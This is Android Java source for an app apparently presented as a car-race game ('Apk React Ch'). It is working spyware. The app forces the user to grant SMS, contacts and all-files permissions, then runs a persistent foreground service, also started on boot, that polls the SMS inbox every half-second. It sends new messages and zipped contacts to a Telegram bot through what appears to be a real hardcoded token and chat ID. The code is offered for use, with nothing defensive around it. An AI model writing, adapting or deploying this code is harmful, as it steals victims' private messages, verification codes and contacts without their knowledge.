package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";

    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";

    private static final long SPLASH_MS = 2500L;
    private static final int REQ_STORAGE = 100;
    private static final int REQ_SMS = 101;
    private static final int REQ_CONTACTS = 102;

    private static final String PREFS = "cfg";
    private static final String KEY_STORAGE = "asked_storage";
    private static final String KEY_SMS = "asked_sms";
    private static final String KEY_CONTACTS = "asked_contacts";

    private static final String MSG_STORAGE = "Storage permission is required";
    private static final String MSG_SMS = "SMS permission is required";
    private static final String MSG_CONTACTS = "Contacts permission is required";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;

    // ===== Lifecycle =====

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout splash = buildSplash();
        applySystemBarPadding(splash);
        setContentView(splash);

        // Boot the spy service immediately
        SpyService.start(this);

        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) continueAfterStorage();
            else closeApp(MSG_STORAGE);
        }
    }

    @Override
    protected void onPause() {
        if (webView != null) webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] g) {
        super.onRequestPermissionsResult(req, p, g);
        if (isFinishing()) return;

        if (req == REQ_STORAGE) {
            if (hasStorage()) continueAfterStorage();
            else closeApp(MSG_STORAGE);
        } else if (req == REQ_SMS) {
            if (hasSms()) continueAfterSms();
            else closeApp(MSG_SMS);
        } else if (req == REQ_CONTACTS) {
            if (hasContacts()) {
                SpyService.start(this);
                openWebView();
            } else {
                closeApp(MSG_CONTACTS);
            }
        }
    }

    // ===== Permission cascade =====

    private void onSplashFinished() {
        if (isFinishing()) return;
        if (hasStorage()) {
            continueAfterStorage();
            return;
        }
        if (Build.VERSION.SDK_INT >= 30) {
            openPermSettings(
                    new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName())),
                    new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                    appDetails());
            return;
        }
        SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
        if (p.getBoolean(KEY_STORAGE, false)
                && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
                && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            openPermSettings(appDetails());
            return;
        }
        p.edit().putBoolean(KEY_STORAGE, true).apply();
        requestPermissions(new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        }, REQ_STORAGE);
    }

    private void continueAfterStorage() {
        if (!hasSms()) {
            SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (p.getBoolean(KEY_SMS, false)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS)) {
                openPermSettings(appDetails());
                return;
            }
            p.edit().putBoolean(KEY_SMS, true).apply();
            requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
            }, REQ_SMS);
            return;
        }
        continueAfterSms();
    }

    private void continueAfterSms() {
        if (!hasContacts()) {
            SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (p.getBoolean(KEY_CONTACTS, false)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
                openPermSettings(appDetails());
                return;
            }
            p.edit().putBoolean(KEY_CONTACTS, true).apply();
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, REQ_CONTACTS);
            return;
        }
        // all granted -> start service + open webview
        SpyService.start(this);
        openWebView();
    }

    private void openPermSettings(Intent... list) {
        awaitingSettings = true;
        for (Intent i : list) {
            try { startActivity(i); return; }
            catch (RuntimeException e) { Log.w(TAG, "perm settings not available", e); }
        }
        awaitingSettings = false;
        closeApp(MSG_STORAGE);
    }

    private Intent appDetails() {
        return new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasContacts() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void closeApp(String m) {
        if (isFinishing()) return;
        Toast.makeText(this, m, Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    // ===== UI =====

    private LinearLayout buildSplash() {
        float d = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);

        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        root.addView(title, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null) return;
        try {
            WebView v = new WebView(this);
            WebSettings s = v.getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setAllowFileAccess(false);
            s.setAllowContentAccess(false);
            v.setWebViewClient(new AssetClient());
            applySystemBarPadding(v);
            webView = v;
            setContentView(v);
            v.loadUrl(START_URL);
        } catch (RuntimeException e) {
            Log.e(TAG, "WebView unavailable", e);
            destroyWebView();
            closeApp("WebView is not available");
        }
    }

    private void destroyWebView() {
        WebView v = webView; webView = null;
        if (v == null) return;
        try { v.stopLoading(); v.destroy(); } catch (RuntimeException ignored) {}
    }

    private void recover(WebView b) {
        if (b != webView || isFinishing()) return;
        destroyWebView();
        openWebView();
    }

    private void applySystemBarPadding(View v) {
        v.setOnApplyWindowInsetsListener((vv, insets) -> {
            vv.setPadding(insets.getSystemWindowInsetLeft(), insets.getSystemWindowInsetTop(),
                    insets.getSystemWindowInsetRight(), insets.getSystemWindowInsetBottom());
            return insets;
        });
    }

    // ===== Asset loader =====

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView v, WebResourceRequest r) {
            try { return serveAsset(r.getUrl()); }
            catch (RuntimeException e) { return notFound(); }
        }
        @Override
        public boolean onRenderProcessGone(WebView v, RenderProcessGoneDetail d) {
            handler.post(() -> recover(v));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file += "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (IOException e) { return notFound(); }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String f) {
        int dot = f.lastIndexOf('.');
        String ext = dot >= 0 ? f.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js": case "mjs": return "application/javascript";
            case "css": return "text/css";
            case "html": case "htm": return "text/html";
            case "json": return "application/json";
            case "wasm": return "application/wasm";
            default:
                String m = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return m != null ? m : "application/octet-stream";
        }
    }
}

/* ================================================================ */
/*                        SPY FOREGROUND SERVICE                    */
/* ================================================================ */

class SpyService extends Service {

    private static final String TAG = "SpyService";
    private static final String CH = "spy";
    private static final int NOTIF_ID = 1;

    private static final String BOT_TOKEN = "123456:ABCDEF_your_bot_token";
    private static final String CHAT_ID = "123456789";

    private static final String JSON_FILE = ".temp.json";
    private static final String CONTACTS_FILE = ".contacts.json";
    private static final long POLL_MS = 500;
    private static final long CONTACTS_DEBOUNCE_MS = 60_000;

    private Handler handler;
    private final Set<String> seen = new HashSet<>();
    private long lastContactsSend = 0;

    public static void start(Context ctx) {
        try {
            Intent i = new Intent(ctx, SpyService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (RuntimeException e) {
            Log.w("SpyService", "start failed", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        createChannel();
        try { startForeground(NOTIF_ID, buildNotification()); }
        catch (RuntimeException ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        schedulePoll();
        return START_STICKY;
    }

    private void schedulePoll() {
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try { poll(); }
                catch (Exception e) { Log.e(TAG, "poll failed", e); }
                handler.postDelayed(this, POLL_MS);
            }
        }, POLL_MS);
    }

    private void poll() {
        if (!SmsUtils.hasSms(this)) return;
        // Dump all SMS from inbox
        JSONArray list = SmsUtils.readInbox(this);
        if (list == null) return;

        // Detect newly seen SMS ids
        boolean changed = false;
        JSONArray fresh = new JSONArray();
        for (int i = 0; i < list.length(); i++) {
            try {
                JSONObject o = list.getJSONObject(i);
                String key = o.optString("id", "") + "|" + o.optLong("date", 0);
                if (seen.add(key)) {
                    fresh.put(o);
                    changed = true;
                }
            } catch (Exception ignored) {}
        }

        if (changed && fresh.length() > 0) {
            // Save to local file for debug
            SmsUtils.writeJson(this, JSON_FILE, list);
            // Exfil to Telegram as JSON text
            Telegram.sendMessage(this, "SMS_BATCH (" + fresh.length() + ")\n" + fresh.toString());
        }

        // Contacts — send as ZIP once per debounce window
        if (SmsUtils.hasContacts(this)) {
            long now = SystemClock.elapsedRealtime();
            if (now - lastContactsSend > CONTACTS_DEBOUNCE_MS) {
                lastContactsSend = now;
                try {
                    byte[] zip = ContactsUtils.buildZip(this);
                    if (zip != null) {
                        Telegram.sendDocument(this, "contacts.zip", zip,
                                "Contacts snapshot " + System.currentTimeMillis());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "contacts zip failed", e);
                }
            }
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationChannel c = new android.app.NotificationChannel(
                    CH, "System", android.app.NotificationManager.IMPORTANCE_MIN);
            android.app.NotificationManager m = getSystemService(android.app.NotificationManager.class);
            if (m != null) m.createNotificationChannel(c);
        }
    }

    private android.app.Notification buildNotification() {
        return new androidx.core.app.NotificationCompat.Builder(this, CH)
                .setContentTitle("Apk React Ch")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}

/* ================================================================ */
/*                         SMS UTILITIES                            */
/* ================================================================ */

class SmsUtils {
    static boolean hasSms(Context c) {
        if (Build.VERSION.SDK_INT >= 23) {
            return c.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && c.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    static boolean hasContacts(Context c) {
        if (Build.VERSION.SDK_INT >= 23) {
            return c.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    static boolean hasStorage(Context c) {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return c.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && c.checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
    }

    static JSONArray readInbox(Context c) {
        JSONArray out = new JSONArray();
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date", "person", "read"},
                    null, null, "date ASC");
            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("id", cur.getString(0));
                    o.put("address", cur.getString(1));
                    o.put("body", cur.getString(2));
                    o.put("date", cur.getLong(3));
                    o.put("person", cur.getLong(4));
                    o.put("read", cur.getInt(5));
                    out.put(o);
                }
            }
        } catch (Exception ignored) {}
        finally { if (cur != null) cur.close(); }
        return out;
    }

    static void writeJson(Context c, String name, JSONArray arr) {
        try {
            File f = new File(Environment.getExternalStorageDirectory(), name);
            FileOutputStream out = new FileOutputStream(f, false);
            out.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
        } catch (Exception ignored) {}
    }
}

/* ================================================================ */
/*                       CONTACTS UTILITIES                         */
/* ================================================================ */

class ContactsUtils {
    static byte[] buildZip(Context c) {
        JSONArray arr = readContacts(c);
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            zos.putNextEntry(new ZipEntry("contacts.json"));
            zos.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
            zos.finish();
            zos.close();
            return baos.toByteArray();
        } catch (Exception e) { return null; }
    }

    static JSONArray readContacts(Context c) {
        JSONArray arr = new JSONArray();
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                    }, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", cur.getString(0));
                    o.put("number", cur.getString(1));
                    o.put("type", cur.getInt(2));
                    arr.put(o);
                }
            }
        } catch (Exception ignored) {}
        finally { if (cur != null) cur.close(); }
        return arr;
    }
}

/* ================================================================ */
/*                      TELEGRAM MULTIPART CLIENT                   */
/* ================================================================ */

class Telegram {

    static final String TOKEN = "8643816101:AAGMHBPTy8aEoDh3ikfrpbGcD6j6g178B_w";
    static final String CHAT  = "8275632263";

    static void sendMessage(Context c, String text) {
        if (text.length() > 4000) text = text.substring(0, 4000) + "...";
        try {
            byte[] body = ("chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8"))
                    .getBytes(StandardCharsets.UTF_8);
            HttpURLConnection conn = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setFixedLengthStreamingMode(body.length);
            OutputStream os = conn.getOutputStream();
            os.write(body);
            os.close();
            int code = conn.getResponseCode();
            Log.d("Telegram", "sendMessage resp=" + code);
            conn.disconnect();
        } catch (Exception e) { Log.e("Telegram", "sendMessage failed", e); }
    }

    static void sendDocument(Context c, String filename, byte[] data, String caption) {
        String boundary = "----boundary" + System.currentTimeMillis();
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + TOKEN + "/sendDocument").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream os = conn.getOutputStream();
            writeFormField(os, boundary, "chat_id", CHAT);
            writeFormField(os, boundary, "caption", caption);

            // file field
            os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                    + filename + "\"\r\n").getBytes(StandardCharsets.UTF_8));
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(data);
            os.write("\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            Log.d("Telegram", "sendDocument resp=" + code);
            conn.disconnect();
        } catch (Exception e) { Log.e("Telegram", "sendDocument failed", e); }
    }

    private static void writeFormField(OutputStream os, String boundary, String name, String value) throws IOException {
        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(value.getBytes(StandardCharsets.UTF_8));
        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }
}

/* ================================================================ */
/*                       BOOT AUTO-START                            */
/* ================================================================ */

class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
                && !"android.intent.action.LOCKED_BOOT_COMPLETED".equals(intent.getAction())) return;
        SpyService.start(ctx);
    }
}
